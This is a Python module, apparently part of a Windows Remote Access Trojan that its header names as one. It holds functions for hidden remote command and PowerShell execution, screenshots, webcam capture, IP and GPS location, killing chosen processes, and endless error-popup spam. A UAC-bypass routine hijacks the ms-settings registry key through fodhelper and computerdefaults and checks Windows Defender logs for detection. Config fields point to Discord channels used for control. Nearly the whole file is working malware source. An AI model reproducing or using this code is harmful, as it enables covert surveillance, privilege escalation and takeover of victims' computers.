#-----------------------------------------------------------------------------------------------------------------------------------
# This is a RAT(Remote Access Trojaner)
# Author: Deltatoolbox aka TornLotus
# Contact: Discord: tornlotus
# Lizenz: MIT License
# Github: https://github.com/Deltatoolbox/not_learning_by_not_doing
#-----------------------------------------------------------------------------------------------------------------------------------
#normal import
import os
import subprocess
import json
from PIL import ImageGrab
import ctypes
import sys
import time
import psutil
import cv2
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
import tkinter as tk
from tkinter import messagebox
import requests
import gpsd
#create or read device id
def uuid():
    try:
        result = subprocess.run(['wmic', 'csproduct', 'get', 'UUID'], stdout=subprocess.PIPE)
        output = result.stdout.decode()
        uuid = output.split('\n')[1].strip()
        return uuid
    except Exception as e:
        print(f"Ein Fehler ist aufgetreten: {e}")
        return None
def save_ids(category_id, info_channel_id, main_channel_id, spam_channel_id):
    # get divce id
    device_id = uuid()
    #set config content
    config = {
        "device_id": device_id,
        "category_id": category_id,
        "info_channel_id": info_channel_id,
        "main_channel_id": main_channel_id,
        "spam_channel_id": spam_channel_id
    }
    #wirte conifg content to config_custom.json
    with open("config_custom.json", "w") as file:
        json.dump(config, file, indent=4)
#check if the file is in the final folder
def check_location(folder):
    # location of file
    aktuelles_skript_pfad = os.path.abspath(__file__)
    # location off final folder
    ordner_pfad = os.path.abspath(folder)
    if os.path.dirname(aktuelles_skript_pfad) == ordner_pfad:
        print(f"check_location=true")
    else:
        print(f"check_location=false")
#get category name
def category_name():
    id = uuid()
    username = os.getlogin()
    category_name = f"{username}-{id}"
    return category_name
#execute cmd commands
def exe_cmd(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, text=True)
        with open("output.txt", "w") as file:
            file.write(output)
    except subprocess.CalledProcessError as e:
        print(f"Fehler beim Ausführen des cmd-Befehls: {e}")
def get_ids():
    with open("config_custom.json", "r") as file:
        config = json.load(file)
    return config
#function to get configs
def read_config():
    with open("config.json", "r") as file:
        return json.load(file)
#test if Admin
def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1
#make screenshot
async def take_sc():
    # create sc
    ImageGrab.grab(all_screens=True).save(f'{os.getcwd()}/sc.png', 'png')    
#shutdown and restart
def shutdown():
    try:
        subprocess.run(["powershell", "-Command", "Stop-Computer"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return
    except subprocess.SubprocessError as e:
        return f"error: {e}"
def restart():
    try:
        subprocess.run(["powershell", "-Command", "Restart-Computer"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return
    except subprocess.SubprocessError as e:
        return f"error: {e}"
#powershell command
def powershell(command):
    try:
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, check=True)
        with open("output.txt", "w") as file:
            file.write(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Fehler beim Ausführen des PowerShell-Befehls: {e}")
def UACbypass(method: int = 1) -> bool:
    if GetSelf()[1]:
        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
        if method == 1:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("computerdefaults --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        elif method == 2:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("fodhelper --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        else:
            return False
        return True
def GetSelf() -> tuple[str, bool]:
    if hasattr(sys, "frozen"):
        return (sys.executable, True)
    else:
        return (__file__, False)
def load_blacklist():
    with open('blacklist.json', 'r') as file:
        data = json.load(file)
        return data['blacklisted_programs']
def save_blacklist(blacklist):
    with open('blacklist.json', 'w') as file:
        json.dump({"blacklisted_programs": blacklist}, file, indent=4)

# function to add to blacklist
def add_blacklist(process_name):
    blacklist = load_blacklist()
    if process_name not in blacklist:
        blacklist.append(process_name)
        save_blacklist(blacklist)
        return f'{process_name} added to blacklist'

# function to remove from blacklist
def remove_blacklist(process_name):
    blacklist = load_blacklist()
    if process_name in blacklist:
        blacklist.remove(process_name)
        save_blacklist(blacklist)
        return f'{process_name} delted from blacklist'

# close blacklist programms
def monitor_blacklisted_programs():
    while True:
        blacklist = load_blacklist()
        for process in psutil.process_iter(['pid', 'name']):
            if process.info['name'] in blacklist:
                psutil.Process(process.info['pid']).kill()
        time.sleep(1)  # time to check
# function to get webcam pics
def webcam(file_path="web.png"):
    cap = cv2.VideoCapture(0)
    # check if camera is open
    if not cap.isOpened():
        return 'error or no camera'
    # take picture
    ret, frame = cap.read()
    # check if picture was captured
    if not ret:
        return 'error'
    else:
        # save image
        cv2.imwrite(file_path, frame)
    cap.release()
def set_volume_max():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(1.0, None)  
def set_volume_min():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(0.0, None)  
def error(titel, message):
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror(titel, message)
    root.destroy()
def error_spam(titel, message):
    while True:
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror(titel, message)
        root.destroy()
def get_processes():
    running_processes = []
    for process in psutil.process_iter(['pid', 'name']):
        try:
            process_info = process.info
            pid = process_info['pid']
            name = process_info['name']
            running_processes.append({'PID': pid, 'Name': name})
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    with open("output.txt", "w") as file:
        for process in running_processes:
            file.write(f"PID: {process['PID']}, Name: {process['Name']}\n")
def get_combined_location():
    try:
        response = requests.get("https://ipinfo.io")
        data = response.json()
        ip_location = data.get("city") + ", " + data.get("region") + ", " + data.get("country")
        gpsd.connect()
        packet = gpsd.get_current()
        if packet.mode >= 2:
            gps_location = f"Latitude: {packet.lat}, Longitude: {packet.lon}"
        else:
            gps_location = "GPS fix not available."
        combined_location = f"IP Location: {ip_location}\nGPS Location: {gps_location}"
        with open("output.txt", "w") as file:
            file.write(combined_location)
        return combined_location
    except Exception as e:
        return str(e)
